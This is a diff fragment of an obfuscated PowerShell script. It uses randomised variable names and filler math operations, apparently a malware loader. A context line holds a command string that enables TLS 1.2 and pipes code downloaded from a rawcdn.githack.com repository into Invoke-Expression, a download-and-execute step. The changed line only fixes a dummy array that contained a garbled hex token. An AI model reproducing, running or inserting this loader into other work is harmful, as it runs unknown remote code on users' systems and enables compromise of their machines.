@@ -835,7 +835,7 @@ ${ptX2zxVbTKQLvjj} = Join-Path $env:SystemRoot 'syswow64\WindowsPowerShell\v1.0\
 try {[void]([Math]::Max(969, 12))} finally {$null = [Math]::Sign(-13); $null = [Math]::Sign(27)}
 $_HWN3EV = '[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; irm https://rawcdn.githack.com/dsteru3421/fd775931-8a95-4d78-858d-13d3087553a5/refs/heads/main/1119f3f-4572e0e89248 | iex'
 
-        $_aZaaMw = @(-52, -640, -233, 210, 7a1d8e6d-34ea4fe2-8ccf6ed6cb6bb71f-39, -232, -184, 795)
+        $_aZaaMw = @(-52, -640, -233, 210, -39, -232, -184, 795)
 $hjwqXnPE8Zty = 0
 foreach ($z3AuG in $_aZaaMw) { $hjwqXnPE8Zty = $hjwqXnPE8Zty + $z3AuG }
 [void]$hjwqXnPE8Zty
